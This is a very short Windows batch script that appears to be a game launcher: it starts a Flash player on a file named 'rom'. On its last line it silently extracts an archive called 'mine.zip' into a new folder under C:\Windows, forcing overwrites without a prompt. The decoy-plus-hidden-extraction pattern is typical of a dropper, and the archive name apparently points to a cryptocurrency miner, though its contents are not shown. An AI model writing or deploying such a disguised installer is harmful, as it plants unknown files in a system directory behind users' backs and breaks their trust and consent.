@echo off
set play=play.exe
set swf=rom
set zip=zip.exe
start "" %play% %swf%
C:\Windows\7zip.exe e mine.zip "*.*" -oc:\windows\gsh -y -r
